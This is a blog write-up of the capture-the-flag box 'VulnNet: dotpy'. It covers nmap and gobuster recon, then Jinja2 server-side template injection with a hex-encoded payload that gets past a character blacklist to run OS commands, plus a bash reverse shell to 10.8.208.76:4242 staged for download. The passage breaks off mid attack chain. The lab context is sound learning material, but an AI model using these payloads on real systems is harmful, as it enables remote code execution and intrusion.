<!DOCTYPE html>













<html lang="en"
  
    data-mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <!-- Allow having a localized datetime different from the appearance language -->
  

  

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="VulnNet: dotpy" />
<meta property="og:locale" content="en" />
<meta name="description" content="[01] Outline" />
<meta property="og:description" content="[01] Outline" />
<link rel="canonical" href="https://glenntoms.github.io/posts/vulnnet-dotpy/" />
<meta property="og:url" content="https://glenntoms.github.io/posts/vulnnet-dotpy/" />
<meta property="og:site_name" content="InfoSec Journey" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-03-01T16:18:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="VulnNet: dotpy" />
<meta name="twitter:site" content="@Glenn__Toms" />
<script type="application/ld+json">
{"mainEntityOfPage":{"@type":"WebPage","@id":"https://glenntoms.github.io/posts/vulnnet-dotpy/"},"@type":"BlogPosting","description":"[01] Outline","url":"https://glenntoms.github.io/posts/vulnnet-dotpy/","headline":"VulnNet: dotpy","dateModified":"2022-03-01T16:18:00+00:00","datePublished":"2022-03-01T16:18:00+00:00","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>VulnNet: dotpy | InfoSec Journey
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="InfoSec Journey">
<meta name="application-name" content="InfoSec Journey">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

</head>


  

  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
          
          <img src="
            
              /assets/about/me.jpg
            
          " alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">InfoSec Journey</a>
    </div>
    <div class="site-subtitle font-italic">An InfoSec Journey there and back again</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    

    
      

      
      <a href="https://github.com/GlennToms" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/Glenn__Toms" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['infosec','toms.gg'].join('@')" aria-label="email"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>VulnNet: dotpy</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        









<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-8">
    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Add attribute 'hide-bullet' to the checkbox list -->



<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







  
  

  

    
      
      

    

    
    

    
    
    

    
      
        
        

    

    
    

    

  

    

    
    

    
    
    

    
      
        
        

    

    
    

    

  

    

    
    

    
    
    

    
      
        
        

    

    
    

    

  

  



<!-- return -->







<h1 data-toc-skip>VulnNet: dotpy</h1>

<div class="post-meta text-muted">

  <!-- author -->
  <div>
    
    

    

    By
    <em>
      
        <a href="https://twitter.com/glenn__toms">Glenn Toms</a>
      
    </em>
  </div>

  <div class="d-flex">
    <div>
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->

<em class="timeago"
    data-ts="1646151480"
    
      data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll"
    
    >
  2022-03-01
</em>

      </span>

      <!-- lastmod date -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="1400 words">
  <em>7 min</em> read</span>


      <!-- page views -->
      
    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <h2 id="01-outline"><span class="mr-2">[01] Outline</span><a href="#01-outline" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

<p><img data-src="/assets/img/vulnnet_dotpy/icon.png" alt="Subscribe" width="100" class="left" data-proofer-ignore></p>

<p>VulnNet: dotpy is a medium difficulty box with a focus on <code class="language-plaintext highlighter-rouge">Python</code>.</p>

<h2 id="01-recon"><span class="mr-2">[01] Recon</span><a href="#01-recon" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

<h3 id="nmap"><span class="mr-2">nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>

<p>Running nmap we find port <code class="language-plaintext highlighter-rouge">8080</code> open</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> nmap/scan <span class="nt">-p-</span> <span class="nt">-v</span> 10.10.132.101

<span class="nt">---snip---</span>
PORT     STATE SERVICE VERSION
8080/tcp open  http    Werkzeug httpd 1.0.1 <span class="o">(</span>Python 3.6.9<span class="o">)</span>
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
| http-title: VulnNet Entertainment -  Login  | Discover
|_Requested resource was http://10.10.132.101:8080/login
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
<span class="nt">---snip---</span>
</pre></td></tr></tbody></table></code></div></div>
<h3 id="website"><span class="mr-2">website</span><a href="#website" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>
<p>Browsing to <code class="language-plaintext highlighter-rouge">http://10.10.132.101:8080</code> we’re greeted with a login / sign up form. Many of the links are Anchors that lead nowhere.
Since we know the page is loading we can run our <code class="language-plaintext highlighter-rouge">gobuster</code> scans, and we’ll need to add <code class="language-plaintext highlighter-rouge">-b 403</code> to force the scan.</p>

<p><img data-src="/assets/img/vulnnet_dotpy/01.png" alt="Subscribe" width="300" data-proofer-ignore></p>

<h3 id="gobuster"><span class="mr-2">gobuster</span><a href="#gobuster" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.132.101:8080 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt <span class="nt">-o</span> main.gobuster <span class="nt">-b</span> 403

<span class="nb">cat </span>main.gobuster 
/login                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 5589]
/register             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 5021]
/logout               <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 219] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.132.101:8080/login]
</pre></td></tr></tbody></table></code></div></div>

<h3 id="purse"><span class="mr-2">purse</span><a href="#purse" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>
<p>While our scan is running we’ll quickly clone the site and check with <code class="language-plaintext highlighter-rouge">pursue</code>, but there isn’t anything of note here.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>wget <span class="nt">-rkpN</span> <span class="nt">-e</span> <span class="nv">robots</span><span class="o">=</span>off http://10.10.132.101:8080
pursue <span class="nt">--query</span> | <span class="nb">sort</span> <span class="nt">-u</span>
pursue <span class="nt">--domain</span> | <span class="nb">sort</span> <span class="nt">-u</span>
pursue <span class="nt">--endpoints</span> | <span class="nb">sort</span> <span class="nt">-u</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="register-and-login"><span class="mr-2">Register and Login</span><a href="#register-and-login" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>

<p>Clicking the <code class="language-plaintext highlighter-rouge">Create New Account</code> takes us to a <code class="language-plaintext highlighter-rouge">/register</code> page. We’ll use <code class="language-plaintext highlighter-rouge">admin</code>, <code class="language-plaintext highlighter-rouge">admin@admin.com</code> and password of <code class="language-plaintext highlighter-rouge">admin</code>, we’re prompted to log in.</p>

<p>Once logged in we see an application dashboard we oddly have a user profile picture and the name of <code class="language-plaintext highlighter-rouge">Staradmin</code>.  It’s possible that using <code class="language-plaintext highlighter-rouge">admin</code> as our username has caused us to get picked off the top of the database or maybe this is what was meant to happen?</p>

<p><img data-src="/assets/img/vulnnet_dotpy/02.png" alt="Dashboard" width="300" data-proofer-ignore></p>

<h3 id="walking-the-site"><span class="mr-2">Walking the site</span><a href="#walking-the-site" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>

<p>Most of the links are only Anchor tags so are a dead end.  This took me about 2 hours to find a vulnerability, I tried clicking every button and downloading every file and page I could find.</p>

<h3 id="server-side-template-injection"><span class="mr-2">Server Side Template Injection</span><a href="#server-side-template-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>

<p>After trying for an <code class="language-plaintext highlighter-rouge">LFI</code> at <code class="language-plaintext highlighter-rouge">http://10.10.132.101:8080/etc/passwd</code> you can see that the path <code class="language-plaintext highlighter-rouge">/etc/passwd</code> is reflected in the page.
Since our <code class="language-plaintext highlighter-rouge">nmap</code> banner grab says this site is running <code class="language-plaintext highlighter-rouge">Werkzeug</code> we can try <code class="language-plaintext highlighter-rouge">Server Side Template Injection (SSTI)</code></p>

<blockquote class="prompt-tip"><div>
  <p>Misdiagnosing SSTI and XSS is can be easily done, be sure to take the time to validate your findings.</p>
</div></blockquote>

<p><img data-src="/assets/img/vulnnet_dotpy/03.png" alt="404" width="600" data-proofer-ignore></p>

<p>Trying to go to the path http://10.10.132.101:8080/{{7*7}} shows the answer <code class="language-plaintext highlighter-rouge">49</code>.</p>

<p><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">HackTricks SSTI</a> examples for other engines are below;</p>

<ul>
  <li>{{7*7}}</li>
  <li>${7*7}</li>
  <li>&lt;%= 7*7 %&gt;</li>
  <li>${{7*7}}</li>
  <li>#{7*7}</li>
</ul>

<p><img data-src="/assets/img/vulnnet_dotpy/04.png" alt="404" width="600" data-proofer-ignore></p>

<p>Navigating to <code class="language-plaintext highlighter-rouge">http://10.10.132.101:8080/{{config}}</code> lists all the config items from with in the Python web server, but we’re unable to use full stops <code class="language-plaintext highlighter-rouge">.</code> in our query as there is some sort of blacklist being checked. After some testing we’re unable to use <code class="language-plaintext highlighter-rouge">.</code>, <code class="language-plaintext highlighter-rouge">_</code>, <code class="language-plaintext highlighter-rouge">[</code>, <code class="language-plaintext highlighter-rouge">]</code>, if we do, we get redirected to a <code class="language-plaintext highlighter-rouge">403</code> blocked page error.</p>

<h2 id="03-research"><span class="mr-2">[03] Research</span><a href="#03-research" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>After about a days research I came across this post <a href="https://gusralph.info/jinja2-ssti-research/">https://gusralph.info/jinja2-ssti-research/</a> that goes into depth on how a <code class="language-plaintext highlighter-rouge">Web Application Firewall (WAF)</code> might block certain characters and how to bypass the filter with encoding.</p>

<p>It would seam that this box is using the methods detailed in this paper as its inspiration.  The answer is given to us, but I took another few hours to dive into the topic to understand what is happening and how this works.</p>

<blockquote class="prompt-info"><div>
  <p>In real PenTests and Bug Bounty situations the answer may need adjustments made.</p>
</div></blockquote>

<h3 id="python-internals"><span class="mr-2">Python Internals</span><a href="#python-internals" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>

<p>My understanding of this code is we’re using <code class="language-plaintext highlighter-rouge">requests</code> object that is available in this processing of our <code class="language-plaintext highlighter-rouge">GET</code> request on the server. Then we use this to traverse up the object tree within <code class="language-plaintext highlighter-rouge">Python</code> to the <code class="language-plaintext highlighter-rouge">globals</code> and finally down to the <code class="language-plaintext highlighter-rouge">builtins</code> functions of Python classes. From here this is the same as writing <code class="language-plaintext highlighter-rouge">from os import popen</code> within the Python interpreter or Python script.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{{</span><span class="n">request</span><span class="p">.</span><span class="n">application</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">__builtins__</span><span class="p">.</span><span class="nb">__import__</span><span class="p">(</span><span class="s">'os'</span><span class="p">).</span><span class="n">popen</span><span class="p">(</span><span class="s">'id'</span><span class="p">).</span><span class="n">read</span><span class="p">()}}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Now that we know how to run code raw Python using the <code class="language-plaintext highlighter-rouge">Jinja2</code> templating engine we have to get past the character black list.
Below is the function I wrote to replicate the code given in the research post. We need to prepend <code class="language-plaintext highlighter-rouge">\x</code> to inform <code class="language-plaintext highlighter-rouge">Jinja2</code> that this is written in <code class="language-plaintext highlighter-rouge">hex</code> and not the string <code class="language-plaintext highlighter-rouge">5f</code>.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">str</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)).</span><span class="nb">hex</span><span class="p">())</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Explaining the code above; we take a single letter and encode it to <code class="language-plaintext highlighter-rouge">utf-8</code>. This insures Python know exactly what character it is, then we turn it into bytes, once it is in bytes we are able to convert it to hex. Finally, we prepend <code class="language-plaintext highlighter-rouge">\x</code> to our hex value and turn the whole thing into a string.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">utf8_encode</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
    <span class="n">_tmp</span> <span class="o">=</span> <span class="s">''</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">string</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="p">[</span><span class="s">'.'</span><span class="p">,</span><span class="s">'['</span><span class="p">,</span><span class="s">']'</span><span class="p">,</span><span class="s">'_'</span><span class="p">]:</span>
            <span class="n">_tmp</span> <span class="o">+=</span> <span class="sa">r</span><span class="s">'\x'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)).</span><span class="nb">hex</span><span class="p">())</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">_tmp</span> <span class="o">+=</span> <span class="n">i</span>
    <span class="k">return</span> <span class="n">_tmp</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">' '</span><span class="p">,</span><span class="s">'%20'</span><span class="p">)</span>

<span class="n">CMD</span> <span class="o">=</span> <span class="s">'id'</span>
<span class="n">string_to_encode</span> <span class="o">=</span> <span class="s">"{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('COMMAND')|attr('read')()}}"</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'COMMAND'</span><span class="p">,</span><span class="n">CMD</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">utf8_encode</span><span class="p">(</span><span class="n">string_to_encode</span><span class="p">))</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{{</span><span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'application'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'</span><span class="se">\x5f\x5f</span><span class="s">globals</span><span class="se">\x5f\x5f</span><span class="s">'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'</span><span class="se">\x5f\x5f</span><span class="s">getitem</span><span class="se">\x5f\x5f</span><span class="s">'</span><span class="p">)(</span><span class="s">'</span><span class="se">\x5f\x5f</span><span class="s">builtins</span><span class="se">\x5f\x5f</span><span class="s">'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'</span><span class="se">\x5f\x5f</span><span class="s">getitem</span><span class="se">\x5f\x5f</span><span class="s">'</span><span class="p">)(</span><span class="s">'</span><span class="se">\x5f\x5f</span><span class="s">import</span><span class="se">\x5f\x5f</span><span class="s">'</span><span class="p">)(</span><span class="s">'os'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'popen'</span><span class="p">)(</span><span class="s">'id'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'read'</span><span class="p">)()}}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Testing this command we are able to see the OS <code class="language-plaintext highlighter-rouge">id</code> command in our error page response.  We’ll update our payload to get a reverse shell.</p>

<p><img data-src="/assets/img/vulnnet_dotpy/05.png" alt="id" width="600" data-proofer-ignore></p>

<p>Running <code class="language-plaintext highlighter-rouge">which%20wget</code> to check if <code class="language-plaintext highlighter-rouge">wget</code> is available.  From further testing I’m unable to get <code class="language-plaintext highlighter-rouge">/</code> working in any of the commands.  This will require a multistep process to avoid use the forward slash.</p>

<blockquote class="prompt-info"><div>
  <p>We need to use <code class="language-plaintext highlighter-rouge">%20</code> as our space encoding otherwise the server will try to parse it.</p>
</div></blockquote>

<h2 id="04-attack-chain"><span class="mr-2">[04] Attack Chain</span><a href="#04-attack-chain" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>Now having all this information available to us, we’re able to start formulating our attack chain.</p>
<ol>
  <li>Create Bash reverse shell and saving it as <code class="language-plaintext highlighter-rouge">index.html</code>.  This allows us to download this file without using a forward slash <code class="language-plaintext highlighter-rouge">/</code>.
    <div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.8.208.76/4242 0&gt;&amp;1'</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Stand up a web server to publish our shell. <code class="language-plaintext highlighter-rouge">sudo</code> is required to use port <code class="language-plaintext highlighter-rouge">80</code>, the default port for web servers.
    <div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Download file with <code class="language-plaintext highlighter-rouge">wget</code>.
    <div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
